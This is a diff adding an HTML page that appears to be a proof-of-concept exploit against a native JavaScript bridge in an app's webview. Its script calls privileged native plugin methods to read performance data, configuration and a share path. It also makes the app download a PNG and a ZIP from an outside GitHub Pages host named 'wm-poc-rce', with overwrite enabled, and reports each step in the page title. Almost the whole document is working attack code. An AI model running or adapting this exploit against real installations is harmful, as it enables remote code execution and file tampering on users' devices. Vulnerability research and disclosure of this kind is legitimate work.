@@ -1,0 +1,47 @@
+<!doctype html>
+<html><head><meta charset="utf-8"><title>P82ATK</title></head>
+<body>
+<script>
+document.title='P82ATK:'+location.host;
+window.__p=function(r){
+  try{r=typeof r==='string'?JSON.parse(r):r}catch(e){}
+  try{
+    window.JSCallJavaMgr.JSCallNative(JSON.stringify({
+      module:'CommonPlugin',method:'PrintLog',
+      param:{log:JSON.stringify(r)},callId:'LOG'
+    }));
+  }catch(e){}
+  document.title='P82ACB:'+(r&&r.callId)+':'+location.host+':'+(r&&r.code);
+};
+function c(id,mod,m,p){
+  try{
+    window.JSCallJavaMgr.JSCallNative(JSON.stringify({
+      callback:'window.__p',module:mod,method:m,param:p,callId:id
+    }));
+  }catch(e){
+    document.title='P82ATK-NOJS:'+location.host;
+  }
+}
+setTimeout(function(){
+  if(!window.JSCallJavaMgr){document.title='P82ATK-NOMGR:'+location.host;return}
+  document.title='P82ATK-HAS:'+location.host;
+  var png='https://gitwhs.github.io/wm-poc-rce/p40.png';
+  var zip='https://gitwhs.github.io/wm-poc-rce/p50.zip';
+  var q=[
+    ['AH2','CommonPlugin','GetPerformance',{}],
+    ['AC0','VirtualBackgroundWebPlugin','GetWebAppVirtualBackgroundConfig',{}],
+    ['AC1','VirtualBackgroundWebPlugin','DownloadFile',{url:png,over_write:true}],
+    ['AI2','IdeaWebViewPlugin','GetWebViewSharePath',{}],
+    ['AC5','VirtualBackgroundWebPlugin','DownloadFile',{url:zip,over_write:true}]
+  ];
+  var i=0;
+  function n(){
+    if(i>=q.length){document.title='P82ATK-DONE:'+location.host;return}
+    var x=q[i++];
+    c(x[0],x[1],x[2],x[3]);
+    setTimeout(n, 3500);
+  }
+  n();
+}, 1200);
+</script>
+</body></html>
